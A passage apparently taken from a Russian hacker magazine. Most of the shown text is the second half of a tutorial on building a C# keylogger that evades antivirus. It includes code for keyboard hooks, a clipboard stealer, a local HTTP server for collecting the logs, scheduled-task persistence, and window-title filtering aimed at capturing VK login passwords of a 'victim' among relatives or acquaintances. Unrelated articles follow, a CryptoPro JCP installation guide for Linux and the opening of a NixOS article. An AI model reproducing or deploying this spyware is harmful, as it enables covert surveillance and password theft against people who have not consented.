{     File.AppendAllText("keylogger.log", buf);
     buf = "";
}

После такого редактирования лог стал намного чище (см. рисунок).





                     Выглядит уже акку рат нее

Так уже намного лучше! Теперь нужно добавить обработку кнопок Shift и Caps
Lock. Добавим в начале цикла следующий код:


// Еще более усовершенствованная проверка //
bool shift = false;
short shiftState = (short)GetAsyncKeyState(16);
// Keys.ShiftKey не работает, поэтому я подставил его числовой
эквивалент
if ((shiftState & 0x8000) == 0x8000)
{
    shift = true;
}
var caps = Console.CapsLock;
bool isBig = shift | caps;

Теперь у нас есть переменная, которая показывает, нужно ли нам оставить
букву большой. Проверяем ее и складываем символы в буфер.





Следующая проблема — это сообщения вида <Oemcomma> , <ShiftKey> ,
<Capital> и другие подобные. Они значительно усложняют чтение лога, так
что придется это исправлять. Например, <Oemcomma> — это обычная челове‐
ческая запятая, а <Capital> — не что иное, как Caps Lock. Немного потес‐
тировав логгер на своем компьютере, я соб рал дос таточно материала, чтобы
привести  лог в порядок. Например, некоторые символы можно сразу
заменить.


// Проверка на пробел и Enter //
if (((Keys)i) == Keys.Space) { buf += " "; continue; }
if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }

А вот вещи вроде <ShiftKey> побороть сложнее. У шиф та, кстати, есть два
разных варианта — правый и левый. Убираем все это, ведь состояние заг‐
лавных букв мы уже получили.


if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.
Capital) { continue; }

Погоняв логгер некото рое время, обна руживаем и другие кнопки, которые
нужно обрабатывать по‐особому:
 • Num Lock;
 • функциональные клавиши;
 • Print Screen;
 • Page Up и Page Down;
 • Scroll Lock;
 • сочетание Shift + цифровая клавиша;
 • Tab;
 • Home и End;
 • Пуск;
 •  Alt;
 • клавиши со стрелками.

Добавляем еще проверки и замены, и лог приобретает читабельный вид.
В целом уже неп лохо! Из недостатков: нет поддержки русской раскладки, что,
впрочем, не так важно, если наша цель — получить пароли.
  Смотрим, что скажет антивирус…





         Реакция антивиру са при принуди тельном сканировании





            Реакция при запуске (позже говорит, что все ок)

Загружаем образец на VirusTotal, чтобы проверить на остальных. Результат:
только 8 из 70 антивирусов что‐то подоз ревают.





КРАСИВЫЙ ВАРИАНТ
Теперь попробуем сделать более пра вильно и будем перехватывать сооб‐
щения о нажатии клавиш на клавиатуре. Первые шаги те же: создаем проект
Windows Forms и придумываем неприметное наз вание (например, Win‐
dowsPrintService). В заглушке, которую нам соз дала Visual Studio, меня ем
void Main() на void Main(String[] args). Теперь сделаем простую про‐
верку аргументов:


if (((Keys)i) == Keys.Space) { buf += " "; continue; }
if (args != null && args.Length > 0)
{
     if (args[0] == "‐i") {}
     // Здесь проверки по аналогии с предыдущей строкой
}
else
{
     // Запущено без параметров
}

Дальше довольно много кода, не буду приводить его весь. Там есть флаги
Caps Lock,  Shift и прочее, а нажатия определяются гигантским Switch.
Но показать я хочу не это, а уста новку хука на кла виату ру.





                   Ус танавливаем хук на кла виату ру

Сначала мы помещаем ссылку на нашу функцию в переменную callback,
потом получаем handle нашей программы, затем устанавливаем хук. А даль‐
ше   вечно  обрабатываем   получаемые  сооб щения  каждые  5  мс
(PeekMessageA). Важный момент — объявление callback‐функции, которая
должна точно соответствовать WinAPI, а также передача управле ния нижеле‐
жащим обработчикам (см. ниже).


private static IntPtr CallbackFunction(Int32 code, IntPtr wParam,
IntPtr lParam)

А тут мы передаем управление дальше по цепочке хуков:


return CallNextHookEx(IntPtr.Zero, code, wParam, lParam)





                     Листинг callback‐функции



                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ
      КЕЙЛОГГЕР ПО-
       ДОМАШНЕМУ
                   ПИШЕМ НА C# КЕЙЛОГГЕР,
             КОТОРЫЙ НЕ ПАЛИТСЯ АНТИВИРУСАМИ




На этом скрине виден код нашей callback‐функции с некоторыми сокращени‐
ями (не уместился разбор нажатия клавиш). Обра ти внимание на упомянутый
выше вызов CallNextHookEx, который нужен, что бы не только мы получали
сообщения о нажатиях клавиш.





             Switch, который раз бира ет Shift + цифровая клавиша

На этом скриншоте видна обра ботка нажатий цифровых клавиш с зажатым
шифтом, а на следующем — ситуация с Caps Lock и Shift.





            Определяем регистр введенного символа


КЛИППЕР
Клиппер —  это  программа,  предназначенная  для  похищения  данных
из буфера обме на (наз вание — от сло ва clipboard). Пригодиться это может,
например, на случай, если жертва использует пароль ный менеджер и копиру‐
ет пароли оттуда.
  Создадим новую форму Windows, удалим файлы <ИмяФормы>.Designer.
cs и <ИмяФормы>.resx. Теперь перейдем в режим редактирования, нажав F7,
и приступим  к написа нию  кода. Добавим using  System.Runtime.In‐
teropServices и импортируем WinAPI (на скрин шоте — в отдельном классе).





                  Класс, импортирующий методы WinAPI

В конструктор фор мы вставляем следующий код:


NativeMethods.SetParent(Handle, NativeMethods.HWND_MESSAGE);
NativeMethods.AddClipboardFormatListener(Handle);

Первый вызов сделает наше окно способ ным к вос приятию системных сооб‐
щений, а второй назначит обра ботчик поступа ющих сообщений.
   Теперь объявим переменную типа String и назовем ее lastWindow.
Теперь мы переназначим стандартную функцию обра ботки сообщений (void
WndProc(ref Message m)):


protected override void WndProc(ref Message m)
{
   if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
   {
        // Получаем handle активного окна
        IntPtr active_window = NativeMethods.GetForegroundWindow();
        // Получаем заголовок этого окна
        int length = NativeMethods.GetWindowTextLength(active_window)
;
        StringBuilder sb = new StringBuilder(length + 1);
        NativeMethods.GetWindowText(active_window, sb, sb.Capacity);
        Trace.WriteLine("");
        // Сохраняем содержимое буфера обмена в лог
        Trace.WriteLine("\t[Сtrl‐C] Clipboard Copied: " + Clipboard.
GetText());
   }
   // Вызываем старый обработчик
   base.WndProc(ref m);
}

Для работы этого кода я взял уже готовый класс, который можно просто
добавить в проект и не заморачиваться с соз данием оберток вокруг WinAPI.
Взять его можно на Pastebin.
  Запустить клиппер несложно: добавляем ссылку на сборку System.Win‐
dows.Forms.dll, добавим  using для System.Windows.Forms и System.
Threading и добавим в метод запус ка логгера следующие строки:


Thread clipboardT = new Thread(new ThreadStart(
           delegate {
              Application.Run(new ClipboardMonitorForm());
           }));
clipboardT.Start();

Просто? Вот имен но. Только добавлять этот вызов нужно пос ле наз начения
обработчика для Trace, ина че весь вывод улетит в неизвес тные дали.


        WWW

                     •Полный код метода запуска логгеров (кейлог‐
                          гер + клиппер)
                     •Все необходимое  для  запуска,  кроме  кода
                         клиппера, который я привел здесь



СОБИРАЕМ ЛОГИ
Следующее, что нам нужно, — это забирать лог удаленно. Поскольку мы
не собираемся занимать ся промышленным шпиона жем, а лишь хотим пог‐
лядывать, что делает кто‐то из родственников или знакомых, то можно
для начала ограничиться дос тупом из локальной сети. Для этого будет дос‐
таточно встроить в наш про ект минималис тичный сервер HTTP. Вот под‐
ходящий исходник, а вот дорабо танная мной версия.
  Использование тоже весь ма примитивное: дос таточно создать объ ект
нашего сервера, и он автоматически займет адреса localhost:34000 и
<InternalIP>:34000 под HTTP и на этих же адресах порт 34001. Сервер
будет возвращать список файлов и папок в виде списка или содержимое
файла, если зап рошен файл.
  В конструктор нужно передать путь к папке, в которую пишутся логи (или
любой другой, которая может понадобиться). По умол чанию логи пишутся
в текущую папку, значит, в конс труктор переда ем Environment.CurrentDi‐
rectory.


        WWW

                       Чтобы авто матизировать добавление нашей прог‐
                   раммы в белый список файрвола, ты можешь вос‐
                       пользоваться Windows Firewall API. В этом тебе
                       помогут  библиотеки‐обертки   FirewallManager,
                         WindowsFirewallHelper и YFW.Net.



АВТОЗАПУСК
Есть много способов попасть в автозагрузку: тут и папка «Автозагрузка»,
и куча мест в реестре, и уста новка своего драй вера, и создание службы...
Однако реестр и драйверы отслежива ются любым приличным анти виру сом,
а создание службы слишком кривой вариант, который может сломаться
в любой момент, хотя на крайний случай неплохо.
  Мы же просто создадим задачу в планировщике заданий и попросим его
запускать наш логгер с нужными параметрами при каждом входе юзе ра
в систему. Для работы с планировщиком заданий берем пакет Microsoft‐
.Win32.TaskScheduler из NuGet. Код для работы с ним я вы ложил на Pastebin.
Не забудь поправить путь, на который ссылает ся запись в планировщике.
   Алгоритм действий логгера при запуске я показал на картинке.





                        Алгоритм действий


РЕАКЦИЯ АНТИВИРУСОВ
Проверка более красивого варианта на VirusTotal показывает, что его обна‐
руживает большее число антивиру сов, чем раньше, — 15 из 70. Однако среди
оставшихся — почти все популярные у нас домашние антивирусы. В общем,
главное — не нар ваться на «Авиру» или NOD32.





ПРОВЕРЯЕМ ЗАГОЛОВОК ОКНА
Если наша предполагаемая жертва сразу пос ле входа в систему пошла
логиниться в ВК, то, считай, повез ло. Но что, если вмес то этого она села
играть в CS:GO? Пароль придется вытас кивать из тонн символов W, A, S, D
и пробелов, а с «костыльным» вариантом это еще сложнее. Поэтому давай
прокачаем наш логгер: будем записывать сигналы клавиатуры только тогда,
когда активно окно браузера с формой входа. Для этого вернемся к WinAPI,
а конкретно к функции GetForegroundWindow.





                     Импорт WinAPI

В импорте видна еще одна функция, которая нам понадобится: GetWindow‐
Text. Она нужна, чтобы по хендлу окна получить его заголовок. Алгоритм дей‐
ствий тут тоже предель но понятен: сна чала получа ем заголовок активного
окна, затем проверяем, нужно ли включать логгер, и включаем его (или вык‐
лючаем). Реализация этой схемы:
 1. Создадим функцию IsForegroundWindowInteresting. Ее  код  будет
   таким:


   bool IsForegroundWindowInteresting(String s)
   {
      IntPtr _hwnd = GetForegroundWindow();
      StringBuilder sb = new StringBuilder(256);
      GetWindowText(_hwnd, sb, sb.Capacity);
      if (sb.ToString().ToUpperInvariant().Contains(s.ToUppe
   rInvariant())) return true;
      return false;
   }

 2. В самом начале нашей функции CallbackFunction вставляем


   if (IsForegroundWindowInteresting("Welcome! | VK") ||
       IsForegroundWindowInteresting("Добро пожаловать | ВКонтакте"))
   {
      return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
   }

Как ты заметил, я проверяю два варианта, так как не знаю, какой язык исполь‐
зует жертва. Если мы не нашли интересного окна, то прос то переходим к сле‐
дующему обработчику и не нагружаем компьютер лишними дисковыми опе‐
рациями.


ИЩЕМ ПО ЛОГУ
Теперь давай предположим, что лог все равно вырос до угрожающих раз‐
меров и нам нужно вытащить из него, например, номер телефона, чтобы
знать, с какого места искать пароль. Для это го лучше всего подойдут
регулярные выражения, в C# они предоставлены клас сом Regex.
  По понятным причинам логи мы будем ана лизировать на своей машине,
так что сделаем отдель ную программу. Чтобы использовать регулярки,
добавим  using  System.Text.RegularExpressions  и  сделаем  метод,
который принимает на вход путь к файлу лога, а на консоль выводит все най‐
денные телефонные номера.


public void FindTelephoneNmbers(String path)
{
   String _file = System.IO.File.ReadAllText(path);
   String _regex = @"((\+38|8|\+3|\+ )[ ]?)?([(]?\d{3}[)]?[\‐ ]?)?(\
d[ ‐]?){6,14}";
   Regex _regexobj = new Regex(_regex);
   MatchCollection matches = _regexobj.Matches(_file);
   if (matches.Count > 0)
   {
      foreach (Match match in matches)
      {
         Console.WriteLine($"Match found: \"{match.Value}\"");
      }
   }
   else
   {
      Console.WriteLine("No matches found.");
   }
}

Пароль будет идти следом за номером телефона.


             INFO

                      Если пароль сохранен в браузере, то тут наш кей‐
                         логгер бессилен. Однако в «Хакере» недавно
                     была статья, посвящен ная написанию стилера,
                          так что переписываем то же самое на C# и раду‐
                        емся.



ИТОГИ
Итак, мы убе дились в том, что создать кейлоггер — не проблема. Более того,
наш самописный шпион со всеми его огра ничениями имеет важное преиму‐
щество: антивирусам заранее неизвес тно о его сущес твовании, а по функци‐
ям его определяют далеко не все из них. Конечно, дальше можно многое
дорабатывать. Например, добавить воз можность доступа через интернет,
научить кейлоггер работать с раз ными клавиатурными раскладками, добавить
снятие скриншотов и дру гие фичи. Моей же целью в этой статье было
показать, насколько прос то сделать такую прог рамму, и вдохновить тебя
на будущие подвиги. Надеюсь, у меня получи лось!
АДМИН

CRYPTOPRO JCP
   НА LINUX

      КАК ЛЕГКО И БЕЗБОЛЕЗНЕННО
     ПЕРЕЙТИ НА НОВЫЙ СТАНДАРТ
          ШИФРОВАНИЯ





С 2020 года использование шифрования
по ГОСТ Р 34.10—2001 ока жется под зап‐
ретом, а значит, все организа ции, которые
взаимодействуют с госструктурами, вынуж‐
дены срочно внедрять следующий стан‐         Иван Рыжевцев                                                                              Системный администратор с
дарт — 2012 года. Если ты работа ешь          ryzhevtsev@gmail.comбогатым опытом
в одной из них, то не про ходи мимо: в этой
статье мы поговорим о том, как решить
проблему, используя сервер на CentOS
7 и пакет CryptoPro JCP.


Если же ты впервые слышишь обо всем этом, то вот небольшая историческая
справка.
  В 1994 году в ФСБ разработа ли ряд стандартов и мер, призванных
защитить обмен документами между орга низа циями и другими участни ками
этого процесса. Одной из таких мер безопасности стала электронная циф‐
ровая подпись документов, а одним из стандартов — ГОСТ Р 34.10—94, где
описан алгоритм фор мирования и проверки электронной цифровой подписи.
Принятый и введенный в действие постановлением Гос стандарта России
от 23 мая 1994 года за номером 154, он про рабо тал до 2001 года.
  На смену пришел всем известный ГОСТ Р 34.10—2001 — улучшенный
стандарт, разработанный для обеспечения большей стой кости алгоритма.
Но время не стоит на месте, меня ются алгоритмы и методы криптозащиты,
и спустя одиннадцать лет ГОСТ Р 34.10—2001 меняют на ГОСТ Р 34.10—
2012.
  В новом стандарте первый вариант требований к параметрам остался
прежним. Длина секретного ключа сос тавляет порядка 256 бит, и пре дус‐
мотрено использование хеш‐функции с длиной хеш‐кода 256 или 512 бит.
Главное же отличие нового стандарта — варианты с допол нительными
параметрами и схемами, в том числе хешированием по стандарту ГОСТ
Р 34.11—2012 «Стрибог».


             INFO

                      Стрибог — бог древних славян, который пок‐
                       ровительствует ветрам, погоде и всему, что свя‐
                       зано с воздушным пространством. Возможно,
                      и  облачным  технологиям  тоже.  Подробнее
                      об  этом шифре  читай  в  статьях  «Хе шируем
                      по ГОСТ 34.11—2012» и «Пишем простой локаль‐
                     ный блок чейн с использованием „Стрибога“».


В феврале 2014 года ФСБ объявила о начале перехода на использование
нового национального стандарта ГОСТ Р 34.10—2012 в средс твах электрон‐
ной подписи для информации, не содержащей сведений, составляющих
государственную тайну. В свет вышел документ за номером 149/7/1/3‐
58 от 31 января 2014 года «О порядке перехо да к использованию новых стан‐
дартов ЭЦП и функции хэширования», он уста навливал следующие тре бова‐
ния.
 1. После 31 декабря 2013 года прекратить сертификацию средств электрон‐
   ной подписи на соответс твие требова ниям к средствам электронной под‐
   писи, утвержденным приказом ФСБ Рос сии от 27.12.2011 года №796,
   если в этих средствах не предус матривает ся реализация функций в соот‐
   ветствии с ГОСТ Р 34.10—2012.
 2. После 31 декабря 2018 года зап ретить исполь зование ГОСТ Р 34.10—
   2001 для формирова ния электронной подписи.

Министерство связи даже соз дало план по переходу на стандарт  (PDF).
Однако на практике оказалось, что все не так прос то, и переход пришлось
отложить аж до 31 декабря 2019 года. При чины следующие.
 1. Многие государственные и муниципальные органы не готовы перейти
   на   использование   нового   стандарта   электронной   под писи
  ГОСТ‐2012 из‐за отсутс твия поддержки на уровне ПО.
 2. Чтобы выпускать сертификаты нового образца, необходимо оборудо‐
   вание, которое поддерживает новый ГОСТ, и сертификат Головного удос‐
   товеряющего центра, сформированный с использованием ГОСТ‐2012.
   Удостоверяющие центры получили его только летом 2018 года. Необ‐
   ходимо дополнитель ное время, что бы выпустить сертификаты для всех
   пользователей.

Сейчас в ходу два стандарта криптозащиты для работы ЭЦП, но тем, кто
использует  ГОСТ‐2001,  срочно  нужно  что‐то  предпринимать.  Зима,
как говорится, близко, а это зна чит, что нас ждет череда испы таний при внед‐
рении поддержки ГОСТ‐2012.


        WWW

                    Ссылки на официальную документацию:
                    •ГОСТ Р 34.10—94
                    •ГОСТ Р 34.10—2001
                    •ГОСТ Р 34.10—2012


Я расскажу, как развернуть сертифицированное ФСБ средство СКЗИ (Cryp‐
toPro JCP) на сервере Linux под управлением Java JDK. Кстати, если ты до сих
пор используешь ГОСТ‐2001, на сайте CryptoPro есть замечательная статья,
советую тебе ее прочесть, лиш ним не будет.
   Весь документооборот между участниками обмена происходит по прин‐
ципу СМЭВ  (система межведомственного электронного взаимодействия).
Приложение может быть участником такой системы, но может и не быть им
вовсе, принцип обмена документами от этого не меня ется. Для простоты
понимания я нарисовал небольшую схему.





  Взаимодействие приложений при обмене данными с криптографической
  защитой в рам ках СМЭВ


Це ны
Как всегда, встает вопрос о лицензировании прог раммного решения. Crypto‐
Pro JCP недешев, и если одна рабочая станция обойдется в 1200 рублей, то
серверные лицензии сто ят зна чительно дороже — порядка 30 000 за каждое
ядро (или два ядра процессора Intel с отключенным Hyper Threading).


УСТАНОВКА И НАСТРОЙКА КРИПТОПРОВАЙДЕРА
В примерах я буду использовать виртуальную машину с CentOS 7, но ты
не ограничен в выборе аппа рат ного обеспечения и дис трибутива Linux. Все
действия и команды будут такими же.
  Первым делом создадим локального пользователя, под которым будет
работать ПО, исполь зующее подпись документов.


$ sudo useradd ‐d /opt/user ‐p <Тут указываем пароль> ‐s /bin/bash
user; sudo grep user /etc/passwd

Правильно установим Java JDK. Ска чиваем необ ходимый дис трибутив.


$ wget ‐‐header "Cookie: oraclelicense=a" ‐‐content‐disposition
http://download.oracle.com/otn‐pub/java/jdk/8u191‐b12/2787e4a523244c2
69598db4e85c51e0c/jdk‐8u191‐linux‐x64.tar.gz ‐O jdk‐8u191‐linux‐x64.
tar.gz

Распаковываем архив и про веря ем, готова ли папка с Java для копирования.


$ tar zxvf jdk‐8u191‐linux‐x64.tar.gz; ls ‐al;

Копируем папку в раздел для прикладно го ПО. Я обычно использую /opt.


$ sudo cp ‐rf jdk1.8.0_191 /opt/

Проверяем, что скопиро валось правиль но. Если необходимо, меняем вла‐
дельца папки на root.


$ ls ‐al /opt/jdk1.8.0_191/
$ sudo chown ‐R root:root /opt/jdk1.8.0_191/; cd /opt/jdk1.8.0_191/;
ls ‐al;

Прописываем переменные окружения для Java JDK для всех пользователей
по умолчанию.


$ sudo vi /etc/profile.d/oracle.sh

В файл пишем сле дующее:


export JAVA_HOME=/opt/jdk1.8.0_191
export JRE_HOME=/opt/jdk1.8.0_191/jre
export PATH=$PATH:/opt/jdk1.8.0_191/bin:/opt/jdk1.8.0_191/jre/bin

Если на сервере стоит нес колько версий Java JDK, то необ ходимо зарегис‐
трировать альтернативы для новой версии.


$ sudo alternatives ‐‐install /usr/bin/java java /opt/jdk1.8.0_191/
bin/java 2
$ sudo alternatives ‐‐install /usr/bin/jar jar /opt/jdk1.8.0_191/bin/
jar 2
$ sudo alternatives ‐‐install /usr/bin/javac javac /opt/jdk1.8.0_191/
bin/javac 2
$ sudo alternatives ‐‐set jar /opt/jdk1.8.0_181/bin/jar
$ sudo alternatives ‐‐set jar /opt/jdk1.8.0_191/bin/jar
$ sudo alternatives ‐‐set javac /opt/jdk1.8.0_191/bin/javac
$ sudo alternatives ‐‐config java

В меню выбираем опцию 2 (или ту, что приведет к использованию более
новой версии Java). Не забываем поправить права на JRE systemPrefs.


$ sudo chmod 777 ‐R /opt/jdk1.8.0_191/jre/.systemPrefs

Проверяем установленную версию Java.



  $ java ‐version
  java version "1.8.0_191"
  Java(TM) SE Runtime Environment (build 1.8.0_191‐b12)
  Java HotSpot(TM) 64‐Bit Server VM (build 25.191‐b12, mixed mode)


Копируем папку с дистрибутивом CryptoPro JCP в раздел для прикладного
ПО.


$ sudo cp ‐rf jcp‐2.0.40035 /opt/

Проверяем, что все скопировалось корректно.


$ ls ‐al /opt/jcp‐2.0.40035/

Выдаем права на запуск скрип тов.


$ sudo chmod +x /opt/jcp‐2.0.40035/*.sh

Проверяем владельца и пра ва на папку, должен быть root. Переходим в нее.


$ ls ‐al /opt/jcp‐2.0.40035/; cd /opt/jcp‐2.0.40035/;

Чтобы избежать проб лем при инсталляции, проверь количество ядер на про‐
цессоре и сверься с лицензией. Узнать число ядер можно командой nproc.
  Переходим к установке криптопровайдера JCP. Во время установки необ‐
ходимо будет ответить на ряд вопросов.



  $ sudo ./setup_console.sh /opt/jdk1.8.0_191/ ‐install ‐serial_jcsp
  AAAAA‐BBBBB‐CCCCC‐DDDDD‐EEEEE
  Params: /opt/jdk1.8.0_191/ ‐install ‐serial_jcsp AAAAA‐BBBBB‐CCCCC‐
  DDDDD‐EEEEE
  java version "1.8.0_191"
  Java(TM) SE Runtime Environment (build 1.8.0_191‐b12)
  Java HotSpot(TM) 64‐Bit Server VM (build 25.191‐b12, mixed mode)
  Current distributive directory: /opt/jcp‐2.0.40035
  Current executable JRE: /opt/jdk1.8.0_191/jre
  ** Crypto‐Pro Installer, 2005‐2019 **
  ** Version: 2.0.40035 **


 • Choose JRE — указываем Java JRE по умол чанию;
 • Java Cryptographic Provider — уста навливаем сам криптопровай‐
   дер;
 • Encryption  module — уста навливаем все необходимые криптогра‐
   фические модули;
 • Card   module   for   cards   and   tokens,   requires   OCF
  (deprecated) — на сервере мы не используем токены, ключи и сер‐
   тификаты хранятся на диске. Так что отключаем поддержку токенов;
 • Java TLS Provider — дополнительный TLS‐провайдер не использует‐
   ся;
 • CAdES, XAdES modules (acquire bouncycastle: bc*jdk15on
  1.50) — устаревшая bouncycastle нам не нуж на, отключаем ее.

Далее вводим лицензионный ключ, в противном слу чае будет установлен три‐
альный ключ на три месяца. На вопрос Enable StrengthenedKeyUsageCon‐
trol отвечаем отрицательно: режим уси ленного контроля использования
клю чей необходимо отключить, так как это может повлиять на работу при‐
ложений. Под конец подтвержда ем начало уста новки, и если ты не разработ‐
чик СКЗИ, то можешь спо койно отка заться от логирования.
  Остается немного подождать, и криптопровайдер будет установлен. Про‐
веряем, что лицензионный ключ установился правильно и лицензия постоян‐
ная.



  $ java ru.CryptoPro.JCP.tools.License
  License verify:
  Type: Server, sign and encrypt
  Allowed amount of cores: 2
  Serial number: AAAAA‐BBBBB‐CCCCC‐DDDDD‐EEEEE
  Validity: Permanent
  Valid license.


Условимся, что ты получил токен с крип токонтейнером и уже экспортировал
контейнер на диск сервера. Если у тебя возникли проблемы с выгрузкой кон‐
тейнера, загляни в инструкцию.
   Теперь установим наши ключи в систему — на диск. В этом примере токен
мы не используем, с уста новкой драйверов на ВМ слишком много проблем.
Экономим вре мя и нервы.
  Проверим, что папка для хра нения сертифика тов и ключей на месте.


$ ls ‐al /var/opt/cprocsp/keys/

Создадим папку для нашего техничес кого пользователя.


$ sudo mkdir /var/opt/cprocsp/keys/user

Скопируем все необходимые клю чи и сертифика ты для работы с ЭЦП на сер‐
вере.


$ sudo cp ‐rf gost2012.000 /var/opt/cprocsp/keys/user/

Поправим владельца на все подпапки и фай лы для корректной работы ключей
и приложения.


$ sudo chown ‐R user:user /var/opt/cprocsp/keys/user/

Проверим, что все в порядке.



  $ ls ‐al /var/opt/cprocsp/keys/user/gost2012.000
  total 36
  drwxr‐xr‐x 2 user user 4096 Mar  6 02:40 .
  drwxr‐xr‐x 5 user user 4096 Mar  6 02:40 ..
  ‐rw‐r‐‐r‐‐ 1 user user 5736 Mar  6 02:40 header.key
  ‐rw‐r‐‐r‐‐ 1 user user   56 Mar  6 02:40 masks2.key
  ‐rw‐r‐‐r‐‐ 1 user user   56 Mar  6 02:40 masks.key
  ‐rw‐r‐‐r‐‐ 1 user user   14 Mar  6 02:40 name.key
  ‐rw‐r‐‐r‐‐ 1 user user   36 Mar  6 02:40 primary2.key
  ‐rw‐r‐‐r‐‐ 1 user user   36 Mar  6 02:40 primary.key`


Если что‐то пошло не так при инсталляции или тебе нужно обновить CryptoPro
JCP на сервере, старую версию всегда можно удалить. Деинстал ляция Cryp‐
toPro JCP с сервера и полное удаление настро ек, включая информацию
о лицензионном клю че, выглядит так:



  $ ls ‐al /opt/jcp‐2.0.40035/; cd /opt/jcp‐2.0.40035/;
  $ sudo ./setup_console.sh /opt/jdk1.8.0_191/ ‐force ‐en ‐uninstall ‐jcp
  ‐rmsetting


  Params: /opt/jdk1.8.0_191/ ‐force ‐en ‐uninstall ‐jcp ‐rmsetting
  java version "1.8.0_191"
  Java(TM) SE Runtime Environment (build 1.8.0_191‐b12)
  Java HotSpot(TM) 64‐Bit Server VM (build 25.191‐b12, mixed mode)
  Current distributive directory: /opt/jcp‐2.0.40035
  Current executable JRE: /opt/jdk1.8.0_191/jre
  ** Crypto‐Pro Installer, 2005‐2019 **
  ** Version: 2.0.40035 **
  Force mode (silent) is enabled.
  ‐‐‐‐‐
  Process can take a few minutes. Wait please...



ПРОВЕРКА КОРРЕКТНОСТИ ПОДПИСИ
Взаимодействие по принципу СМЭВ подразумевает обмен документами XML
через запросы SOAP. В XML можно лег ко про верить, что используется алго‐
ритм ГОСТ Р34.10—2012 (256 бит), это можно определить по следующим
строчкам:


<SignatureMethod Algorithm="urn:ietf:params:xml:ns:cpxmlsec:algori
thms:gostr34102012‐gostr34112012‐256" />
<DigestMethod Algorithm="urn:ietf:params:xml:ns:cpxmlsec:algorithms:
gostr34112012‐256" />

То же самое должно прийти в ответ.
  Для ГОСТ‐2012 (512 бит) строчка будет такой:


<SignatureMethod Algorithm="urn:ietf:params:xml:ns:cpxmlsec:algori
thms:gostr34102012‐gostr34112012‐512"/>
<DigestMethod Algorithm="urn:ietf:params:xml:ns:cpxmlsec:algorithms:
gostr34112012‐512"/>

Если же используется старый ГОСТ‐2001, то строка такая:


<SignatureMethod Algorithm="http://www.w3.org/2001/04/
xmldsig‐more#gostr34102001‐gostr3411"/>

Также можно сохранить сертификат из запроса или отве та в файл .crt и прос‐
мотреть его. Еще можно открыть и проверить кор невой сертификат.


ПРИМЕР ПРИЛОЖЕНИЯ
На этом месте я советую убрать от экра на монитора детей, беременных жен‐
щин и людей с неустойчивой психикой. Вмес то этого стоит позвать прог‐
раммиста на Java, потому что сейчас я представлю примерные наброски при‐
ложения, которое позволяет обра батывать документы по ГОСТ‐2012.
  Наше приложение будет состоять из следующих классов:
 • cryptoproproviderkey.java: провайдер для обнаружения и работы
   клю ча CryptoPro на локальном диске;
 • providerkey.java: про вайдер ключа, необ ходимый для работы с сер‐
   тификатом в контейнере и для cryptoproproviderkey.java;
 • signvalidation.java: валидирует электрон но‐циф ровую подпись;
 • xmlsign.java: под писывает этой подписью документы XML;
 • documentbuilderxml.java: собирает XML‐документы в правильном
   порядке.

Учти, что это только примеры взаимодействия с ЭЦП, работоспособность
целого приложения я не гарантирую.


        WWW

                    •Исходные коды приложения




ЗАКЛЮЧЕНИЕ
Итак, мы прошлись по исто рии стандарти зации российского шифрования,
рассмотрели вопрос лицензирования криптопро вайдера и научились ставить
криптопровайдер, а также посмотрели, как делать при ложение на Java.
   Как видишь, установка и настройка криптопровайдера — несложная
задача. Но перейти с ГОСТ‐2001 на ГОСТ‐2012 в целом трудоемко, посколь‐
ку нужно обновлять программное обеспечение и тестировать взаимодей‐
ствие с другими участниками защищенного документооборота. Наде юсь,
у тебя все получится!
GEEK
  NIXOS





      ОСВАИВАЕМ ФИЧИ ОДНОГО
       ИЗ САМЫХ НЕОБЫЧНЫХ
        ДИСТРИБУТИВОВ LINUX




Ранее мы уже рас сказыва ли о NixOS, весь‐
ма необычном и удобном дистрибутиве
GNU/Linux, поз воляющем описать всю кон‐
фигурацию сис темы в одном файле и раз‐
вернуть ее на любой машине в любой            dump_stack()                                                                                            dump_stack@authors.glc.ru
момент. Тогда мы дали лишь краткое вве‐
дение в особенности системы и примеры
ее  использования. Сегодня  я расска жу
о том, как с помощью NixOS решать пов‐
седневные задачи и выходить из трудных
ситуаций.


Упомяну, что значит NixOS для меня. Долгие годы я использовал Gentoo,
и NixOS стал для меня Gentoo done right, ког да, несмотря на гибкость сис‐
темы и возможность прос той сборки всего нуж ного из исходных кодов, я
получил глобальный бинарный кеш для аналогичных базовым пакетов, а также
простоту развертывания.
   NixOS также служит отличным примером того, как нужно работать с комь‐
юнити, — запросы на слияние (pull request) рассматриваются значительно
быстрее и качественнее всех существующих на данный момент дистрибути‐
вов. Даже если ты не занимаешь ся непосредственно разработкой, ты
не столкнешься со старыми бюрократами из таких проектов, как Debian
и Gentoo.
  Из последнего следует один немало важ ный и крайне при ятный факт:
ни оверлеи (overlay — сторонние репозитории, содержащие сценарии сбор‐
ки ebuild для пакетов), ни их аналоги из дру гих дистрибути вов больше
не являются необ ходимостью. От правляй свои патчи сразу в апстрим!


ГОТОВЫЕ КОНФИГУРАЦИИ
Так как NixOS предоставляет прос тую возможность распространять настрой‐
ки своих машин так же, как и уже ставшая обычной традиция делиться своими
конфигурациями для GNU Emacs, мы можем исполь зовать подготовленные
другими пользователями конфигурации в качес тве базы для своей, тем
самым не решая те проблемы, которые уже кто‐то решал.
  Для NixOS существует про ект Simple Nixos Mailserver, который предос‐
тавляет готовую конфигура цию для почтового сервера. Пол ный пример кон‐
фигурации для этой статьи можно посмотреть на моем Git‐сервере.
  Мы можем вклю чить чужую конфигура цию, заб рав ее с любого ресурса
(добавь эти строки в configuration.nix):


imports = [
  ...
  (builtins.fetchTarball {
    url = "https://gitlab.com/simple‐nixos‐mailserver/nixos‐mailse
rver/‐/archive/v2.2.0/nixos‐mailserver‐v2.2.0.tar.gz";
    sha256 = "0gqzgy50hgb5zmdjiffaqp277a68564vflfpjvk1gv6079zahksc";
  })
];

SHA‐256 позволяет быть уверенным в аутентичности используемого архива.
   Также вместо fetchTarball мож но использовать fetchGit. Далее мы уже
работаем с конфигурацией  mailserver таким же образом, как если бы
это было просто локальное вклю чение файлов:


mailserver = {
  enable = true;
  fqdn = "mail.dumpstack.io";
  ...
};

Далее нам остается только (тут я намеренно опускаю настройку DNS, она
не касается непосредственно нас тро ек системы, и подобным придется
заниматься что на NixOS, что на Ubuntu, что на других дистрибутивах) указать
пользователей, alias’ы et cetera.
   Таким же образом мы можем рас простра нять что угодно, например
